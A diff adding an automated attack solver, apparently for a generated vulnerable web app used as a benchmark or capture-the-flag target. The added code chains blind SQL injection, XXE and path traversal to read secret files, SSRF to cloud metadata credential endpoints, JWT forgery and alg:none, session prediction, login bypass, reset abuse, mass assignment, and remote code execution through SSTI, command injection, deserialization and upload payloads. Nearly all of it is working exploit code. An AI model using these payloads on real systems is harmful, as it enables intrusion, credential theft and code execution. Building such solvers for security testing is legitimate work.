@@ -503,6 +503,196 @@ def solve_gql(m):
     if p: return True, auth, "ssrf|gql", p
     return False, auth, None, None
 
+# ============================================================================
+# Traditional transport solver — mirrors the REST solver but every attack is a server-rendered HTML
+# page. Forms submit x-www-form-urlencoded to /b/<slug>/<op>; each page embeds the raw result as a
+# <script type="application/json" id="mj"> blob, which we parse. Used when manifest.api === 'traditional'.
+# ============================================================================
+
+def trad_get(path, headers=None):
+    r = U.Request(ROOT + path, headers=dict(headers or {}), method="GET")
+    try: x = U.urlopen(r, timeout=20); return x.status, x.read().decode('utf-8', 'replace'), dict(x.headers)
+    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)
+    except Exception as e: return 0, str(e), {}
+
+def trad_post(path, fields, headers=None):
+    data = urllib.parse.urlencode(fields).encode()
+    h = dict(headers or {}); h["Content-Type"] = "application/x-www-form-urlencoded"
+    r = U.Request(ROOT + path, data=data, headers=h, method="POST")
+    try: x = U.urlopen(r, timeout=25); return x.status, x.read().decode('utf-8', 'replace'), dict(x.headers)
+    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)
+    except Exception as e: return 0, str(e), {}
+
+def mj(html):
+    m = re.search(r'<script type="application/json" id="mj">(.*?)</script>', html or '', re.S)
+    if not m: return None
+    try: return json.loads(m.group(1))
+    except: return None
+
+def _trad_blind_ok(slug, q):
+    s, t, _ = trad_get("/b/" + slug + "/search?q=" + urllib.parse.quote(q)); d = mj(t)
+    if isinstance(d, dict) and isinstance(d.get("found"), int): return d["found"] > 0
+    if isinstance(d, list): return len(d) > 0
+    return False
+
+def _trad_blind_pw(slug):
+    chars = ''.join(chr(c) for c in range(0x20, 0x7f) if chr(c) not in "'\"\\%_"); pw = ''
+    for i in range(1, 48):
+        if not _trad_blind_ok(slug, "%' AND (SELECT length(password) FROM users WHERE username='" + ADM + "') >= " + str(i) + " -- "): break
+        f = None
+        for c in chars:
+            if _trad_blind_ok(slug, "%' AND (SELECT substr(password," + str(i) + ",1) FROM users WHERE username='" + ADM + "') = '" + c + "' -- "): f = c; break
+        if f is None: return None
+        pw += f
+    return pw or None
+
+def trad_cred(auth, blobd, headers):
+    if auth == "jwt" and blobd.get("token"): return {"Authorization": "Bearer " + blobd["token"]}
+    if auth == "apikey" and blobd.get("apiKey"): return {"X-API-Key": blobd["apiKey"]}
+    if auth == "session":
+        sc = headers.get("Set-Cookie", ""); m = re.search(r'mutie_sid=([^;]+)', sc)
+        if m: return {"Cookie": "mutie_sid=" + m.group(1)}
+    return None
+
+def trad_gather(views, auth):
+    facts = {}
+    for v in views.get("content", []):
+        slug = v["slug"]
+        s, t, _ = trad_get("/b/" + slug + "/search?q=" + urllib.parse.quote(INJ)); d = mj(t)
+        if isinstance(d, list):
+            for r in d:
+                if isinstance(r, dict) and r.get("name") == ADM and r.get("category"): facts["password"] = r["category"]
+        if not facts.get("password") and isinstance(d, dict) and ("found" in d or (isinstance(d.get("query"), str) and ADM in d["query"])):
+            pw = _trad_blind_pw(slug)
+            if pw: facts["password"] = pw
+    for v in views.get("import", []):
+        for tgt in ("file:///app/config/app.conf", "file:///app/secret/app.key"):
+            xml = '<?xml version="1.0"?><!DOCTYPE c [<!ENTITY x SYSTEM "%s">]><invoice><customer>&x;</customer></invoice>' % tgt
+            s, t, _ = trad_post("/b/" + v["slug"] + "/import", {"xml": xml}); d = mj(t) or {}
+            leak = ((d.get("imported") or {}).get("customer")) or ""
+            if leak:
+                mm = re.search(r'admin\.password=(\S+)', leak); facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
+                if "password" not in leak and leak.strip(): facts["appkey"] = leak.strip()
+    for v in views.get("fileportal", []):
+        for name, key in (("../secret/app.key", "appkey"), ("../config/app.conf", "conf"), ("../sessions.json", "sess")):
+            s, t, _ = trad_get("/b/" + v["slug"] + "/file?name=" + urllib.parse.quote(name)); d = mj(t) or {}
+            txt = d.get("content") if isinstance(d, dict) else ""
+            if not txt: continue
+            if key == "appkey" and "password" not in txt: facts["appkey"] = txt.strip()
+            mm = re.search(r'admin\.password=(\S+)', txt); facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
+            if key == "sess":
+                arr = jparse(txt)
+                if isinstance(arr, list):
+                    for pair in arr:
+                        if isinstance(pair, list) and len(pair) == 2 and pair[1] == ADM: facts["sid"] = pair[0]
+    for v in views.get("disclosure", []):
+        s, t, _ = trad_get("/b/" + v["slug"] + "/openapi"); spec = mj(t) or {}
+        xi = spec.get("x-internal") or {}
+        if xi.get("signingKey"): facts["appkey"] = xi["signingKey"]
+        mm = re.search(r'admin\.password=(\S+)', xi.get("config", "") or ""); facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
+        if spec.get("x-admin-key"): facts["adminkey"] = spec["x-admin-key"]
+        try:
+            ex = spec["paths"]["/login"]["post"]["requestBody"]["content"]["application/json"]["example"]
+            if ex and ex.get("password"): facts["password"] = facts.get("password") or ex["password"]
+        except Exception: pass
+        for opp in ("backup", "leak"):
+            s, t, _ = trad_get("/b/" + v["slug"] + "/" + opp); d = mj(t) or {}; bf = d.get("text") or ""
+            mm = re.search(r'admin\.password=(\S+)', bf); facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
+            mk = re.search(r'SIGNING_KEY=(\S+)', bf); facts["appkey"] = facts.get("appkey") or (mk.group(1) if mk else None)
+    for v in views.get("account", []):
+        un = "u" + str(int(time.time() * 1000) % 1000000)
+        trad_post("/b/" + v["slug"] + "/register", {"username": un, "password": "pw12345"})
+        s, t, h = trad_post("/b/" + v["slug"] + "/login", {"username": un, "password": "pw12345"})
+        cred = trad_cred(auth, mj(t) or {}, h)
+        if cred:
+            s2, t2, _ = trad_get("/b/" + v["slug"] + "/user-lookup?username=" + ADM, cred); d2 = mj(t2) or {}
+            if d2.get("password"): facts["password"] = d2["password"]
+            if d2.get("apikey"): facts["adminkey"] = facts.get("adminkey") or d2["apikey"]
+    for v in views.get("webhook", []):
+        for url in ("http://169.254.169.254/latest/meta-data/iam/security-credentials/role", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"):
+            s, t, _ = trad_post("/b/" + v["slug"] + "/fetch", {"url": url, "method": "GET", "headers": "{}"}); d = mj(t) or {}
+            if d.get("status") == 200:
+                inner = jparse(d.get("body") or "") or {}; key = inner.get("SecretAccessKey") or inner.get("access_token")
+                if key: facts["appkey"] = facts.get("appkey") or key
+    return facts
+
+def trad_admin_creds(views, auth, facts):
+    cands = []
+    if auth == "jwt":
+        payload = {"username": ADM, "role": "admin", "exp": int(time.time()) + 3600}
+        if facts.get("appkey"): cands.append(("jwt-forge", {"Authorization": "Bearer " + forge_hs256(facts["appkey"], payload)}))
+        cands.append(("jwt-algnone", {"Authorization": "Bearer " + forge_none({"username": ADM, "role": "admin"})}))
+        cands.append(("jwt-weak", {"Authorization": "Bearer " + forge_hs256("secret", payload)}))
+    if auth == "session":
+        cands.append(("session-predict", {"Cookie": "mutie_sid=s-1000"}))
+        if facts.get("sid"): cands.append(("session-file", {"Cookie": "mutie_sid=" + facts["sid"]}))
+        cands.append(("remember-me-b64", {"Cookie": "mutie_remember=" + base64.b64encode(ADM.encode()).decode()}))
+        cands.append(("remember-me-plain", {"Cookie": "mutie_remember=" + ADM}))
+    if auth == "apikey" and facts.get("adminkey"):
+        cands.append(("apikey-leak", {"X-API-Key": facts["adminkey"]}))
+    for v in views.get("account", []):
+        slug = v["slug"]
+        for inj in [ADM + "' -- ", "' OR role='admin' -- "]:
+            s, t, h = trad_post("/b/" + slug + "/login", {"username": inj, "password": "x"}); c = trad_cred(auth, mj(t) or {}, h)
+            if c: cands.append(("login-bypass", c))
+        trad_post("/b/" + slug + "/reset", {"username": ADM})
+        s, t, _ = trad_post("/b/" + slug + "/reset-confirm", {"username": ADM, "token": "rt-" + ADM, "password": "pwned123"})
+        if (mj(t) or {}).get("ok"):
+            s2, t2, h2 = trad_post("/b/" + slug + "/login", {"username": ADM, "password": "pwned123"}); c = trad_cred(auth, mj(t2) or {}, h2)
+            if c: cands.append(("reset-weak", c))
+        un = "pwn" + str(int(time.time() * 1000) % 100000)
+        trad_post("/b/" + slug + "/register", {"username": un, "password": "pw12345", "role": "admin"})
+        s, t, h = trad_post("/b/" + slug + "/login", {"username": un, "password": "pw12345"}); c = trad_cred(auth, mj(t) or {}, h)
+        if c: cands.append(("mass-assign", c))
+        if facts.get("password"):
+            s, t, h = trad_post("/b/" + slug + "/login", {"username": ADM, "password": facts["password"]}); c = trad_cred(auth, mj(t) or {}, h)
+            if c: cands.append(("creds-login", c))
+    return cands
+
+def trad_try_sinks(views, hdr):
+    ssti = ["{{ process.mainModule.require('child_process').execSync('id') }}", "<%= process.mainModule.require('child_process').execSync('id') %>",
+            "{{{ process.mainModule.require('child_process').execSync('id') }}}", "- var cp = require('child_process')\n= cp.execSync('id').toString()"]
+    for v in views.get("adminreport", []):
+        for pl in ssti:
+            s, t, _ = trad_post("/b/" + v["slug"] + "/render", {"template": pl, "data": "{}"}, hdr)
+            if "uid=" in str((mj(t) or {}).get("output", "")): return "ssti"
+    for v in views.get("adminbackup", []):
+        for fld in ({"name": "x.tgz; id #"}, {"host": "127.0.0.1; id #"}, {"name": "x; id #"}, {"branch": "main; id #"}):
+            s, t, _ = trad_post("/b/" + v["slug"] + "/backup", fld, hdr)
+            if "uid=" in str((mj(t) or {}).get("log", "")): return "cmdi"
+    for v in views.get("adminbackup", []) + views.get("account", []):
+        for payload in (json.dumps({"name": "_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()"}),
+                        json.dumps({"__js_function": "function(){ return process.mainModule.require('child_process').execSync('id').toString() }"})):
+            s, t, _ = trad_post("/b/" + v["slug"] + "/import-job", {"job": payload}, hdr)
+            if "uid=" in str((mj(t) or {}).get("result", "")): return "deser"
+    for v in views.get("fileportal", []) + views.get("adminupload", []):
+        for fn, content in (("s.js", "module.exports=()=>require('child_process').execSync('id').toString()"), ("t.ejs", "<%= process.mainModule.require('child_process').execSync('id') %>")):
+            trad_post("/b/" + v["slug"] + "/ext", {"filename": fn, "content": content}, hdr)
+            s, t, _ = trad_post("/b/" + v["slug"] + "/ext-run", {"name": fn}, hdr)
+            if "uid=" in str((mj(t) or {}).get("output", "")): return "upload"
+    return None
+
+def trad_try_ssrf(views):
+    for v in views.get("webhook", []):
+        s, t, _ = trad_post("/b/" + v["slug"] + "/fetch", {"url": "http://127.0.0.1:9000/token", "method": "GET", "headers": "{}"}); d = mj(t) or {}
+        if d.get("status") == 200:
+            tok = (jparse(d.get("body") or "") or {}).get("token")
+            if tok:
+                s2, t2, _ = trad_post("/b/" + v["slug"] + "/fetch", {"url": "http://127.0.0.1:9000/run-task", "method": "POST",
+                            "headers": json.dumps({"Content-Type": "application/json", "X-Task-Token": tok}), "body": json.dumps({"cmd": "id"})}); d2 = mj(t2) or {}
+                if d2.get("status") == 200 and "uid=" in (jparse(d2.get("body") or "") or {}).get("output", ""): return "ssrf->run-task"
+    return None
+
+def solve_trad(m):
+    views = views_by_kind(m); auth = m.get("auth")
+    facts = trad_gather(views, auth)
+    for how, hdr in trad_admin_creds(views, auth, facts):
+        sink = trad_try_sinks(views, hdr)
+        if sink: return True, auth, how + "|trad", sink
+    p = trad_try_ssrf(views)
+    if p: return True, auth, "ssrf|trad", p
+    return False, auth, None, None
+
 def wait_ready(timeout=30):
     deadline = time.time() + timeout
     while time.time() < deadline:
@@ -522,6 +712,8 @@ if __name__ == "__main__":
         s, t, _ = get("/manifest"); m = jparse(t) or {}
         if m.get("api") == "graphql":
             success, auth, how, sink = solve_gql(m)
+        elif m.get("api") == "traditional":
+            success, auth, how, sink = solve_trad(m)
         else:
             success, auth, how, sink = solve()
         ok += 1 if success else 0
